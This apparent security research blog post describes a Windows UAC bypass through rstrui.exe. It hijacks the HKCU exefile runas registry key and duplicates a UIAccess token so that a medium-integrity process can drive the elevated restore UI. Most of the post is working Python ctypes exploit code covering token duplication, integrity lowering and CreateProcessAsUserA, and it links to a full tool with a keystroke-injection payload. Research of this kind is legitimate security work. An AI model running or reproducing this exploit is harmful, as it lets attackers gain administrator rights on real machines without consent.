---
layout: post
title: RESEARCHING RSTRUI PROCESS
vimeoId: 344967402
---

Rstrui is a signed Microsoft executable, which handles the system restore features. This executable has "autoElevate" property set to true in the manifest which
means it will run with high integrity level. While playing around in [ProcessMonitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from
Sysinternals, I found out that rstrui.exe accepts command line arguments, I focused on the "/RUNONCE" argument.

While monitoring the activity, I couldn't find any vulnerabilities at first. The UI starts up and fails, because I haven't configured the
system restore feature on the test machine. Pressed the left button "Run System Restore", see picture below. 

![_config.yml]({{ site.baseurl }}/images/rstrui_ui.JPG)

And checked back at ProcessMonitor, saw that it suffers from a class hijacking vulnerability, see picture below.

![_config.yml]({{ site.baseurl }}/images/rstrui_procmon.JPG)

If adding path to another executable in the {Default} value at "HKCU\Software\Classes\exefile\shell\runas\command\" we can trick rstrui to elevate another executable once
pressing "Run System Restore" button.

{% include vimeo.html id=page.vimeoId %}

One problem is that we cannot control this UI from a Medium IL process. In order to navigate the UI from a Medium IL process, we need to obtain a UIAccess token.

The first step is to either create or find a process with UIAccess flag, in this example we use "msra.exe" but could use "ctfmon.exe" which is running by default,
in that case we don't need to create a new process.
```python
shinfo = ShellExecInfo()
shinfo.cbSize = ctypes.sizeof(shinfo)
shinfo.fMask = 0x00000040
shinfo.lpFile = "msra.exe"
shinfo.nShow = 0
shinfo.lpParameters = None

with disable_fsr():
	if ctypes.windll.shell32.ShellExecuteExW(ctypes.byref(shinfo)):
		print "[+] Created host process PID: {pid} using ShellExecuteExW".format(pid=shinfo.hProcess)
	else:
		print "[-] Unable to create host process using ShellExecuteExW"
		return False
```

Open the token with TOKEN_DUPLICATE and TOKEN_QUERY access
```python
token = ctypes.c_void_p(ctypes.c_void_p(-1).value)
if ctypes.windll.ntdll.NtOpenProcessToken(shinfo.hProcess, (TOKEN_DUPLICATE | TOKEN_QUERY),
					ctypes.byref(token)) == ctypes.c_ulong(0xC0000001):
	print "[-] Unable to open process token using NtOpenProcessToken"
	return False
else:
	print "[+] Opened process token using NtOpenProcessToken: {token}".format(token=token)
```

Duplicate primary token with TOKEN_ALL_ACCESS access
```python
dtoken = ctypes.c_void_p(ctypes.c_void_p(-1).value)
if ctypes.windll.ntdll.NtDuplicateToken(token, TOKEN_ALL_ACCESS, None, False,
					TOKEN_TYPE.TokenPrimary, ctypes.byref(dtoken)) == ctypes.c_ulong(0xC0000001):
	print "[-] Unable to duplicate token using NtDuplicateToken"
	return False
else:
	print "[+] Duplicated token using NtDuplicateToken: {dtoken}".format(dtoken=dtoken)
```

Initialize Medium SID and lower the duplicated token from Medium+ to Medium integrity
```python
mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
pIntegritySid = ctypes.c_void_p()

if ctypes.windll.ntdll.RtlAllocateAndInitializeSid(ctypes.byref(mlAuthority), 1, IntegrityLevel.MEDIUM_RID,
					0, 0, 0, 0, 0, 0, 0, ctypes.byref(pIntegritySid)) == ctypes.c_ulong(0xC0000001):
	print "[-] Unable to Initialize Medium SID using RtlAllocateAndInitializeSid"
	return False
else:
	print "[+] Initialized Medium SID using RtlAllocateAndInitializeSid"

saa = SID_AND_ATTRIBUTES()
saa.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
saa.Sid = pIntegritySid

tml = TOKEN_MANDATORY_LABEL()
tml.Label = saa

if ctypes.windll.ntdll.NtSetInformationToken(dtoken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
					ctypes.byref(tml), ctypes.sizeof(tml)) == ctypes.c_ulong(0xC0000001):													
	print "[-] Unable to lower duplicated token IL from Medium+ to Medium using NtSetInformationToken"
	return False
else:
	print "[+] Lowered duplicated token IL from Medium+ to Medium using NtSetInformationToken"
```

Using CreateProcessAsUserA we can create a new process using the duplicated token, which has the UIAccess flag.
This process can control a High IL process with SendKeys or keyboard events.
```python
lpStartupInfo = STARTUPINFO()
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
lpStartupInfo.dwFlags = 0x00000001
lpStartupInfo.wShowWindow = 5
lpProcessInformation = PROCESS_INFORMATION()
lpApplicationName = "notepad.exe" # Path to executable that controls High IL process

if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationName, None, None, False,
						(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo), ctypes.byref(lpProcessInformation)):
	print "[-] Unable to create process using CreateProcessAsUserA"
	return False
else:
	print "[+] Created process PID: {pid} using CreateProcessAsUserA".format(pid=lpProcessInformation.dwProcessId)
```

Full code can be found here, with payload (uihack.py) example to send keyboard events to High IL processes.
* [https://github.com/rootm0s/UIAP](https://github.com/rootm0s/UIAP)
